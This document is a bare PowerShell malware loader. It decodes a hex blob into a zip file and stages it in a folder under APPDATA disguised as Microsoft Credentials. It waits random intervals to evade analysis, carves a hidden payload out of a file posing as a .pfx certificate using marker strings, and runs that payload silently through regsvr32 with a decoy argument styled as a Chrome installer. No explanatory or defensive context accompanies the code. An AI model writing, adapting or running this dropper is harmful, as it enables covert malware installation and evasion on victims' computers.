$hexData = ''
$stagingDir = "$env:APPDATA\Microsoft\Credentials"
if (-not (Test-Path $stagingDir)) {
    New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
}

$zipPath = Join-Path $stagingDir 'LightYellow4.zip'
$data = [byte[]]::new($hexData.Length/2)
for($i=0; $i -lt $data.Length; $i++){ $data[$i] = [Convert]::ToByte($hexData.Substring($i*2,2),16) }
[IO.File]::WriteAllBytes($zipPath, $data)

Start-Sleep -Seconds (Get-Random -Minimum 4 -Maximum 9)

$extractPath = $stagingDir
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

Remove-Item -Path $zipPath -Force

Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 7)

$drvFile = Join-Path $extractPath 'LightYellow4.pfx'
$drvContent = [IO.File]::ReadAllBytes($drvFile)

$startMarker = [byte[]]([System.Text.Encoding]::ASCII.GetBytes("<<MARINA_START>>"))
$endMarker = [byte[]]([System.Text.Encoding]::ASCII.GetBytes("<<MARINA_END>>"))

$startIndex = -1
$endIndex = -1

for ($i = 0; $i -lt ($drvContent.Length - $startMarker.Length); $i++) {
    $match = $true
    for ($j = 0; $j -lt $startMarker.Length; $j++) {
        if ($drvContent[$i + $j] -ne $startMarker[$j]) {
            $match = $false
            break
        }
    }
    if ($match) {
        $startIndex = $i
        break
    }
}

for ($i = 0; $i -lt ($drvContent.Length - $endMarker.Length); $i++) {
    $match = $true
    for ($j = 0; $j -lt $endMarker.Length; $j++) {
        if ($drvContent[$i + $j] -ne $endMarker[$j]) {
            $match = $false
            break
        }
    }
    if ($match) {
        $endIndex = $i + $endMarker.Length
        break
    }
}

$cleanDrvContent = if ($startIndex -ne -1 -and $endIndex -ne -1) {
    $secondStartIndex = -1
    for ($i = $endIndex; $i -lt ($drvContent.Length - $startMarker.Length); $i++) {
        $match = $true
        for ($j = 0; $j -lt $startMarker.Length; $j++) {
            if ($drvContent[$i + $j] -ne $startMarker[$j]) {
                $match = $false
                break
            }
        }
        if ($match) {
            $secondStartIndex = $i
            break
        }
    }
    
    if ($secondStartIndex -ne -1) {
        $drvContent[$endIndex..$secondStartIndex]
    } else {
        $drvContent[$endIndex..$drvContent.Length]
    }
} else {
    $drvContent
}

Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)

[IO.File]::WriteAllBytes($drvFile, $cleanDrvContent)

Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 7)

Start-Process regsvr32.exe -ArgumentList '/s','/i:googlechromebusiness.msi',$drvFile -NoNewWindow
